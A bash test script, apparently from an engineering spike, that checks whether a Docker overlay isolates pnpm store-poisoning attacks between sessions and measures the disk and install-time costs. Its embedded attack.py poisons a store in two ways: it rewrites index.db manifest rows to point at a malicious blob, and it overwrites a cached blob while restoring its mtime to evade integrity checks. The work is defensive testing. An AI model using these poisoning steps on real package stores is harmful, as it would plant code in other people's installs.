#!/usr/bin/env bash
#
# store-overlay-spike.sh — does putting the pnpm store inside a Docker overlay,
#   over a shared read-only base, isolate a store-index attack between sessions,
#   and at what disk/time cost?
#
# Run on a host with the Docker daemon (the "services" host); it CANNOT run in a
# session container (no Docker socket). Needs only Docker; the node+python
# toolchain comes from a baked image. Cleans up its volumes on exit.
#
# Every cell HARD-ASSERTS the facts it depends on and exits non-zero on any
# failure, so a silently no-op attack, a failed control, or a failed install
# cannot read as a pass:
#   - an attack must report the change it claims (H4: >=1 manifest row; H2:
#     mtime preserved on the poisoned blob);
#   - "clean" means the installed file's sha512 EQUALS the original blob's
#     digest, not merely "readable and lacking a marker";
#   - "poison" means the marker is present AND the digest differs;
#   - the no-overlay shared-bind control MUST poison the victim (fail, not warn);
#   - H2 and H4 each get their own overlay cell and their own bind control.
#
# What it measures (see FINDINGS.md for the numbers and their limits):
#   - store-upper copy-up (index.db + any poisoned blob), NOT the copied
#     node_modules tree, which is reported separately and is the req-10 cost;
#   - base-hit vs new-package install cost;
#   - incremental overlay overhead vs a plain-store COPY install (this is NOT
#     the transition from today's hardlink installs — both sides copy here).
#
# Usage: ./store-overlay-spike.sh
set -uo pipefail

IMG="pnpm-spike:local"
build_img(){ docker image inspect "$IMG" >/dev/null 2>&1 && return
  docker build -q -t "$IMG" - >/dev/null <<'DOCKER'
FROM node:22-bookworm-slim
RUN npm i -g pnpm@12.4.2 && pnpm --version
RUN apt-get update && apt-get install -y --no-install-recommends python3 && rm -rf /var/lib/apt/lists/*
DOCKER
}
CE="-e COREPACK_ENABLE_DOWNLOAD_PROMPT=0"
PKG_SPEC="is-odd@3.0.1"; NEW_SPEC="left-pad@1.3.0"
PKG_NAME="${PKG_SPEC%@*}"; PKG_VER="${PKG_SPEC#*@}"
PROBE_REL="node_modules/.pnpm/$PKG_NAME@$PKG_VER/node_modules/$PKG_NAME/index.js"
SCALE_PKGS='"express":"4.21.2","lodash":"4.17.21","react":"18.3.1","chalk":"5.3.0","typescript":"5.6.3","vite":"5.4.11","zod":"3.23.8","axios":"1.7.9"'

ok(){ echo -e "    \033[32m$1\033[0m"; }
bad(){ echo -e "    \033[31m$1\033[0m"; }
warn(){ echo -e "    \033[33m$1\033[0m"; }
hdr(){ echo -e "\n\033[1m$1\033[0m"; }
PASS=0; FAIL=0
pass(){ ok "$1"; PASS=$((PASS+1)); }
fail(){ bad "FAIL: $1"; FAIL=$((FAIL+1)); }

command -v docker >/dev/null || { echo "docker CLI not found"; exit 2; }
docker info >/dev/null 2>&1 || { echo "docker daemon not reachable"; exit 2; }

VOL="pv-store"
ALL_OVL="pv-a4 pv-b4 pv-a2 pv-b2 pv-n pv-t pv-t2 pv-p pv-q"
cleanup(){ docker volume rm $ALL_OVL >/dev/null 2>&1 || true; docker volume rm "$VOL" >/dev/null 2>&1 || true; }
trap cleanup EXIT
cleanup
docker volume create "$VOL" >/dev/null
MP="$(docker volume inspect -f '{{.Mountpoint}}' "$VOL")"
# host-fs ops (measurement, not a "session") run as root in a container on /mp
mp(){ docker run --rm -v "$MP":/mp "$IMG" bash -c "$1"; }

# pnpm keeps resolution metadata in XDG_CACHE_HOME/pnpm, SEPARATE from the
# store; a fresh session cannot resolve offline without it. Sessions here get
# ONLY that cache dir (not the whole backing dir), so a session cannot see the
# base or other uppers except through its own /store overlay.
CACHE_MOUNT() { echo "-v $MP/cache:/cache -e XDG_CACHE_HOME=/cache"; }

hdr "0. Environment"
build_img
echo "    docker $(docker version -f '{{.Server.Version}}')  driver $(docker info -f '{{.Driver}}')  host $(docker info -f '{{.OperatingSystem}}')"
echo "    image $IMG  pnpm $(docker run --rm $IMG pnpm --version)"
echo "    work root (ext4): $MP"

warm_base(){ docker run --rm $CE -e XDG_CACHE_HOME=/mp/cache -v "$MP":/mp "$IMG" bash -c "
  set -e; mkdir -p /tmp/pw && cd /tmp/pw
  printf '{\"name\":\"w\",\"version\":\"1.0.0\",\"dependencies\":{$1}}' > package.json
  pnpm --store-dir /mp/$2 install --silent >/mp/$2.warm.log 2>&1"; }

hdr "1. Warm the base store (lowerdir) — a WARMED FIXTURE, not the proposed verified base"
warm_base "\"$PKG_NAME\":\"$PKG_VER\"" "base-store" && pass "base store warmed with $PKG_SPEC" \
  || { fail "warm failed"; mp 'tail -5 /mp/base-store.warm.log'; exit 1; }
# original CLEAN digest, learned by content hash (== the store blob's name)
read PROBE_HASH PROBE_SIZE < <(docker run --rm $CE $(CACHE_MOUNT) -v "$MP":/mp "$IMG" bash -c "
  set -e; mkdir -p /tmp/pj && cd /tmp/pj
  printf '{\"name\":\"j\",\"dependencies\":{\"$PKG_NAME\":\"$PKG_VER\"}}' > package.json
  pnpm --store-dir /mp/base-store --offline install --silent >/tmp/pj.log 2>&1
  P=/tmp/pj/$PROBE_REL; h=\$(sha512sum \"\$P\" | cut -d' ' -f1)
  test -f /mp/base-store/v11/files/\${h:0:2}/\${h:2} && echo \"\$h \$(stat -c %s \"\$P\")\"" | tail -1)
BASE_STORE_SZ=$(mp 'du -sb /mp/base-store' | cut -f1)
BASE_IDX_SZ=$(mp 'stat -c %s "$(find /mp/base-store -name index.db)"')
base_idx_sum(){ mp 'sha256sum "$(find /mp/base-store -name index.db)"' | cut -d' ' -f1; }
BASE_IDX_SUM=$(base_idx_sum)
echo "    clean probe digest ${PROBE_HASH:0:16}…  size ${PROBE_SIZE:-?}B  base ${BASE_STORE_SZ}B  index.db ${BASE_IDX_SZ}B"
[ -n "$PROBE_HASH" ] || { fail "probe hash empty"; exit 1; }

cat > /tmp/attack.py <<'PY'
import sys, os, hashlib, sqlite3
mode, oldhash, osize = sys.argv[1], sys.argv[2], int(sys.argv[3])
store="/store"; idx=None
for r,_,fs in os.walk(store):
    if "index.db" in fs: idx=os.path.join(r,"index.db")
blobdir=os.path.join(os.path.dirname(idx),"files")
oldpath=os.path.join(blobdir, oldhash[:2], oldhash[2:])
if mode=="h4":
    payload=b"module.exports=function(){require('fs').writeFileSync('/store/PWNED','1');return true};//"
    poison=(payload+b"x"*max(0,osize-len(payload)))[:osize] if osize>=len(payload) else payload
    newhash=hashlib.sha512(poison).hexdigest()
    dest=os.path.join(blobdir,newhash[:2],newhash[2:]); os.makedirs(os.path.dirname(dest),exist_ok=True); open(dest,"wb").write(poison)
    con=sqlite3.connect(idx); cur=con.cursor(); hit=0
    for key,data in cur.execute("select key,data from package_index").fetchall():
        if oldhash.encode() in data:
            nd=data.replace(oldhash.encode(),newhash.encode()); assert len(nd)==len(data)
            cur.execute("update package_index set data=? where key=?",(nd,key)); hit+=1
    con.commit(); con.close(); print("ROWS=%d"%hit)
elif mode=="h2":
    st=os.stat(oldpath); old=int(st.st_mtime)          # copy-up preserves lower mtime
    poison=(b"POISON"+b"x"*max(0,osize-6))[:osize]
    open(oldpath,"wb").write(poison)                    # triggers copy-up; bumps mtime to now
    os.utime(oldpath,(st.st_atime,st.st_mtime))         # restore -> defeats the mtime fast path
    new=int(os.stat(oldpath).st_mtime)
    print("MT_OLD=%d MT_NEW=%d"%(old,new))
PY
mp 'true'; docker run --rm -v "$MP":/mp -v /tmp/attack.py:/attack.py "$IMG" cp /attack.py /mp/attack.py

attack(){ docker run --rm -v "$1":/store -v "$MP/attack.py":/attack.py "$IMG" bash -c "python3 /attack.py $2 $PROBE_HASH $PROBE_SIZE"; }
# prints: RC=<n> DIG=<sha512|-> NM=<bytes> PM=<PWNED|POISON|none>
victim(){ docker run --rm $CE $(CACHE_MOUNT) -v "$1":/store "$IMG" bash -c "
  mkdir -p /tmp/v && cd /tmp/v
  printf '{\"name\":\"v\",\"dependencies\":{\"$PKG_NAME\":\"$PKG_VER\"}}' > package.json
  pnpm --store-dir /store --offline --config.verify-store-integrity=true install --silent >/tmp/i.log 2>&1; rc=\$?
  P=/tmp/v/$PROBE_REL; dig=\$(sha512sum \"\$P\" 2>/dev/null | cut -d' ' -f1); nm=\$(du -sb /tmp/v/node_modules 2>/dev/null | cut -f1)
  if grep -q PWNED \"\$P\" 2>/dev/null; then pm=PWNED; elif grep -q POISON \"\$P\" 2>/dev/null; then pm=POISON; else pm=none; fi
  echo RC=\$rc DIG=\${dig:--} NM=\${nm:-0} PM=\$pm" 2>&1 | tail -1; }
field(){ echo "$1" | tr ' ' '\n' | sed -n "s/^$2=//p"; }
make_ovl(){ docker volume rm "$1" >/dev/null 2>&1 || true; docker volume create "$1" --driver local --opt type=overlay --opt device=overlay --opt "o=lowerdir=$2,upperdir=$3,workdir=$4" >/dev/null; }
# clean iff install succeeded AND the installed digest equals the original
assert_clean(){ local r="$1" who="$2"; [ "$(field "$r" RC)" = 0 ] && [ "$(field "$r" DIG)" = "$PROBE_HASH" ] && [ "$(field "$r" PM)" = none ] \
  && pass "$who installed CLEAN (rc=0, digest matches original)" || fail "$who not clean: $r"; }
assert_poison(){ local r="$1" who="$2"; { [ "$(field "$r" PM)" = PWNED ] || [ "$(field "$r" PM)" = POISON ]; } && [ "$(field "$r" DIG)" != "$PROBE_HASH" ] \
  && pass "$who got POISON (marker present, digest differs) — attack real, overlay is the mitigation" || fail "$who NOT poisoned (control must poison): $r"; }

hdr "2. H4 isolation — manifest rewrite through A's upper vs B's upper"
mp 'mkdir -p /mp/a4-up /mp/a4-wk /mp/b4-up /mp/b4-wk'
make_ovl pv-a4 "$MP/base-store" "$MP/a4-up" "$MP/a4-wk"; make_ovl pv-b4 "$MP/base-store" "$MP/b4-up" "$MP/b4-wk"
a=$(attack pv-a4 h4); echo "    attack A: $a"
[ "$(field "$a" ROWS)" -ge 1 ] 2>/dev/null && pass "H4 rewrote $(field "$a" ROWS) manifest row(s)" || { fail "H4 attack did not rewrite a manifest row: $a"; }
[ "$(base_idx_sum)" = "$BASE_IDX_SUM" ] && pass "base index.db BYTE-UNCHANGED (copy-up hit A's upper)" || fail "base index.db changed"
[ -n "$(mp 'find /mp/a4-up -name index.db')" ] && pass "A's rewritten index.db is in A's private upper" || fail "no index.db in A's upper — attack did not copy up"
r=$(victim pv-b4); echo "    victim B: $r"; assert_clean "$r" "victim B (H4, own upper)"

hdr "3. H4 shared-bind control — same attack, NO overlay, must poison B"
warm_base "\"$PKG_NAME\":\"$PKG_VER\"" "bind4" >/dev/null 2>&1
a=$(attack "$MP/bind4" h4); echo "    attack bind: $a"
[ "$(field "$a" ROWS)" -ge 1 ] 2>/dev/null && pass "H4 rewrote the manifest on the shared bind" || fail "H4 bind attack no-op: $a"
r=$(victim "$MP/bind4"); echo "    victim on bind: $r"; assert_poison "$r" "victim (H4, shared bind)"

hdr "4. H2 isolation — mtime-preserved byte poison, own cell + own control"
mp 'mkdir -p /mp/a2-up /mp/a2-wk /mp/b2-up /mp/b2-wk'
make_ovl pv-a2 "$MP/base-store" "$MP/a2-up" "$MP/a2-wk"; make_ovl pv-b2 "$MP/base-store" "$MP/b2-up" "$MP/b2-wk"
a=$(attack pv-a2 h2); echo "    attack A: $a"
mo=$(field "$a" MT_OLD); mn=$(field "$a" MT_NEW)
{ [ -n "$mo" ] && [ "$mo" = "$mn" ]; } && pass "H2 preserved the blob mtime ($mo == $mn) — defeats the fast path" || fail "H2 did not preserve mtime ($mo vs $mn)"
[ "$(base_idx_sum)" = "$BASE_IDX_SUM" ] && pass "base index.db still byte-unchanged after H2" || fail "base index.db changed under H2"
r=$(victim pv-b2); echo "    victim B: $r"; assert_clean "$r" "victim B (H2, own upper)"
warm_base "\"$PKG_NAME\":\"$PKG_VER\"" "bind2" >/dev/null 2>&1
a=$(attack "$MP/bind2" h2); echo "    attack bind: $a"
mo=$(field "$a" MT_OLD); mn=$(field "$a" MT_NEW); { [ -n "$mo" ] && [ "$mo" = "$mn" ]; } && pass "H2 bind attack preserved mtime" || fail "H2 bind attack mtime not preserved: $a"
r=$(victim "$MP/bind2"); echo "    victim on bind: $r"; assert_poison "$r" "victim (H2, shared bind)"

hdr "5. Disk — store-upper copy-up AND the copied node_modules (req 7, req 10)"
A_UP_SZ=$(mp 'du -sb /mp/a4-up' | cut -f1)
rb=$(victim pv-b4); B_NM=$(field "$rb" NM); B_UP_SZ=$(mp 'du -sb /mp/b4-up' | cut -f1)
mp 'mkdir -p /mp/n-up /mp/n-wk'; make_ovl pv-n "$MP/base-store" "$MP/n-up" "$MP/n-wk"
rn=$(docker run --rm $CE $(CACHE_MOUNT) -v pv-n:/store "$IMG" bash -c "
  mkdir -p /tmp/n && cd /tmp/n; printf '{\"name\":\"n\",\"dependencies\":{\"${NEW_SPEC%@*}\":\"${NEW_SPEC#*@}\"}}' > package.json
  pnpm --store-dir /store install --silent >/dev/null 2>&1; echo NM=\$(du -sb /tmp/n/node_modules 2>/dev/null | cut -f1)" 2>&1 | tail -1)
N_UP_SZ=$(mp 'du -sb /mp/n-up' | cut -f1); N_NM=$(field "$rn" NM)
pct=$(awk "BEGIN{printf \"%.1f\", $BASE_IDX_SZ*100/$BASE_STORE_SZ}")
warn "du -sb is APPARENT bytes, not allocated blocks; node_modules is copied per session (package-import-method=copy) and is NOT shared by the store lowerdir."
printf "    %-46s %s\n" "base store total" "${BASE_STORE_SZ} B  (index.db ${BASE_IDX_SZ} B = ${pct}%)"
printf "    %-46s %s\n" "A store-upper after H4 attack" "${A_UP_SZ} B"
printf "    %-46s %s\n" "B store-upper after base-hit install" "${B_UP_SZ} B"
printf "    %-46s %s\n" "B node_modules (base-hit, copied per session)" "${B_NM} B"
printf "    %-46s %s\n" "new-pkg store-upper" "${N_UP_SZ} B"
printf "    %-46s %s\n" "new-pkg node_modules" "${N_NM} B"

hdr "5b. index.db fraction at a larger scale (ratio for one workload, not a bound)"
warm_base "$SCALE_PKGS" "scale-store" >/dev/null 2>&1 || true
if [ -n "$(mp 'find /mp/scale-store -name index.db 2>/dev/null')" ]; then
  S_SZ=$(mp 'du -sb /mp/scale-store' | cut -f1); S_IDX_SZ=$(mp 'stat -c %s "$(find /mp/scale-store -name index.db)"')
  S_N=$(mp 'find /mp/scale-store -path "*/files/*" -type f | wc -l'); spct=$(awk "BEGIN{printf \"%.1f\", $S_IDX_SZ*100/$S_SZ}")
  printf "    %-46s %s files, %s B store, index.db %s B (%s%%)\n" "scale set (8 top-level deps)" "$S_N" "$S_SZ" "$S_IDX_SZ" "$spct"
else warn "scale warm produced no store"; fi

hdr "6. Req 7 — install time: today's HARDLINK vs the design's overlay COPY (scale set, install timed inside the container, 5 reps)"
if [ -n "$(mp 'find /mp/scale-store -name index.db 2>/dev/null')" ]; then
  # today's baseline: store + node_modules on the SAME fs, hardlink import.
  # No set -e: pnpm exits non-zero on the esbuild "ignored build scripts" notice
  # while still populating the tree, so tolerate it and time the install anyway.
  hl=$(docker run --rm $CE -e SCALE="$SCALE_PKGS" "$IMG" bash -c '
    mkdir -p /work/proj && cd /work/proj
    printf "{\"name\":\"h\",\"dependencies\":{%s}}" "$SCALE" > package.json
    pnpm --store-dir /work/store --config.package-import-method=hardlink install --silent >/dev/null 2>&1 || true
    f=$(find node_modules/.pnpm -name "*.js" | head -1); ln=$(stat -c %h "$f")
    ts=""; for i in 1 2 3 4 5; do rm -rf node_modules; s=$(date +%s.%N); pnpm --store-dir /work/store --config.package-import-method=hardlink --offline install --silent >/dev/null 2>&1 || true; e=$(date +%s.%N); ts="$ts $(awk -v a=$s -v b=$e "BEGIN{printf \"%.3f\", b-a}")"; done
    echo "LINKS=$ln MIN=$(echo $ts | tr " " "\n" | sort -n | head -1) TIMES=[$ts ]"' 2>&1 | tail -1)
  # the design: store on an overlay (scale base), node_modules cross-fs, copy import
  mp 'mkdir -p /mp/t2-up /mp/t2-wk'; make_ovl pv-t2 "$MP/scale-store" "$MP/t2-up" "$MP/t2-wk"
  ov=$(docker run --rm $CE $(CACHE_MOUNT) -e SCALE="$SCALE_PKGS" -v pv-t2:/store "$IMG" bash -c '
    mkdir -p /tmp/proj && cd /tmp/proj
    printf "{\"name\":\"o\",\"dependencies\":{%s}}" "$SCALE" > package.json
    ts=""; for i in 1 2 3 4 5; do rm -rf node_modules; s=$(date +%s.%N); pnpm --store-dir /store --config.package-import-method=copy --offline install --silent >/dev/null 2>&1 || true; e=$(date +%s.%N); ts="$ts $(awk -v a=$s -v b=$e "BEGIN{printf \"%.3f\", b-a}")"; done
    f=$(find node_modules/.pnpm -name "*.js" | head -1); ln=$(stat -c %h "$f")
    echo "LINKS=$ln MIN=$(echo $ts | tr " " "\n" | sort -n | head -1) TIMES=[$ts ]"' 2>&1 | tail -1)
  hlmin=$(field "$hl" MIN); ovmin=$(field "$ov" MIN); hll=$(field "$hl" LINKS); ovl=$(field "$ov" LINKS)
  printf "    %-44s min %ss  %s\n" "today  HARDLINK (link count $hll)" "$hlmin" "$(echo "$hl" | sed 's/.*TIMES=//')"
  printf "    %-44s min %ss  %s\n" "design COPY on overlay (link count $ovl)" "$ovmin" "$(echo "$ov" | sed 's/.*TIMES=//')"
  { [ "$hll" -gt 1 ] 2>/dev/null && [ "$ovl" = 1 ] 2>/dev/null; } && pass "baseline is genuinely hardlinked (>1) and the design copies (1) — a valid req-7 comparison" || warn "link counts unexpected (hl=$hll copy=$ovl) — comparison may be invalid"
  awk -v a=$hlmin -v b=$ovmin "BEGIN{if(a>0)printf \"    overlay-copy / hardlink (min install): %.2fx\n\", b/a}"
  warn "install timed INSIDE the container (no spawn). ext4 has no reflink, so copy is a full copy; on a reflink fs the copy is near-free. This is the honest req-7 baseline the earlier single-shot lacked."
else warn "scale-store missing — skipping req 7 timing"; fi

hdr "6b. Req 10 — per-session ALLOCATED disk: today's hardlink vs overlay copy (scale set; du -sB1 = allocated bytes)"
if [ -n "$(mp 'find /mp/scale-store -name index.db 2>/dev/null')" ]; then
  # today: store + nm SAME fs, hardlink. Marginal = combined(store+nm) - store, since a
  # combined du counts a hardlinked inode ONCE, so nm's shared bytes do not re-count.
  r10hl=$(docker run --rm $CE -e SCALE="$SCALE_PKGS" "$IMG" bash -c '
    set -e; mkdir -p /work/proj && cd /work/proj
    printf "{\"name\":\"h\",\"dependencies\":{%s}}" "$SCALE" > package.json
    pnpm --store-dir /work/store --config.package-import-method=hardlink install --silent >/dev/null 2>&1
    st=$(du -sB1 /work/store | cut -f1); tot=$(du -scB1 /work/store /work/proj/node_modules | tail -1 | cut -f1)
    echo "STORE=$st TOTAL=$tot"' 2>&1 | tail -1)
  st=$(field "$r10hl" STORE); tot=$(field "$r10hl" TOTAL); hl_marg=$((tot - st))
  # design: overlay copy session over the scale base. Marginal = store-upper + copied node_modules.
  cpr=$(docker run --rm $CE $(CACHE_MOUNT) -e SCALE="$SCALE_PKGS" -v pv-t2:/store "$IMG" bash -c '
    mkdir -p /tmp/proj && cd /tmp/proj; printf "{\"name\":\"o\",\"dependencies\":{%s}}" "$SCALE" > package.json
    pnpm --store-dir /store --config.package-import-method=copy --offline install --silent >/dev/null 2>&1
    echo NM=$(du -sB1 /tmp/proj/node_modules | cut -f1)' 2>&1 | tail -1)
  cp_nm=$(field "$cpr" NM); upper=$(mp 'du -sB1 /mp/t2-up | cut -f1'); gen=$(mp 'du -sB1 /mp/scale-store | cut -f1')
  cp_marg=$((upper + cp_nm))
  printf "    %-52s %s B\n" "shared base store (one generation, amortized)" "$gen"
  printf "    %-52s %s B\n" "TODAY per-session marginal (hardlink)" "$hl_marg"
  printf "    %-52s %s B  (upper %s + node_modules %s)\n" "DESIGN per-session marginal (overlay copy)" "$cp_marg" "$upper" "$cp_nm"
  awk -v h=$hl_marg -v c=$cp_marg "BEGIN{ if(h>0) printf \"    design/today per-session marginal disk: %.0fx\n\", c/h; else printf \"    today marginal ~0 (hardlink shares the store); design pays %d B per session\n\", c }"
  warn "ext4, du -sB1 = ALLOCATED bytes. Copy is a full copy here, so the design's per-session cost is ~the node_modules tree — the req-10 regression the section-3 ext4 gate names. req 10 is NOT met on ext4 by copy alone; a reflink fs (btrfs/XFS) makes the copy near-free, and du cannot see reflink sharing, so re-measure there with a df used-space delta."
else warn "scale-store missing — skipping req 10"; fi

hdr "7. Concurrency — two installs into separate uppers over one base"
mp 'mkdir -p /mp/p-up /mp/p-wk /mp/q-up /mp/q-wk'
make_ovl pv-p "$MP/base-store" "$MP/p-up" "$MP/p-wk"; make_ovl pv-q "$MP/base-store" "$MP/q-up" "$MP/q-wk"
conc(){ docker run --rm $CE $(CACHE_MOUNT) -v "$1":/store "$IMG" bash -c "
  mkdir -p /tmp/c && cd /tmp/c; printf '{\"name\":\"c\",\"dependencies\":{\"$PKG_NAME\":\"$PKG_VER\"}}' > package.json
  pnpm --store-dir /store --offline install --silent >/tmp/c.log 2>&1; echo RC=\$?" 2>&1 | tail -1; }
c1=$(conc pv-p & conc pv-q & wait); r1=$(echo "$c1" | field "$(echo "$c1" | head -1)" RC)
n_ok=$(echo "$c1" | grep -c 'RC=0'); n_all=$(echo "$c1" | grep -c 'RC=')
[ "$n_ok" = "$n_all" ] && [ "$n_all" -ge 2 ] && pass "both concurrent installs succeeded ($n_ok/$n_all)" || fail "a concurrent install failed: $c1"
warn "each session writes its OWN index.db in its OWN upper — there is no SHARED writable index to lock. This shows separate-upper installs do not error; it is NOT a shared-lock-correctness test."

hdr "Summary"
echo "    PASS=$PASS FAIL=$FAIL"
if [ "$FAIL" -eq 0 ]; then ok "Store-in-overlay isolates the H4 and H2 store-index attacks (each with a poisoning control); disk/time captured with their limits."; exit 0
else bad "$FAIL cell(s) failed — the overlay store result is NOT established on this host."; exit 1; fi
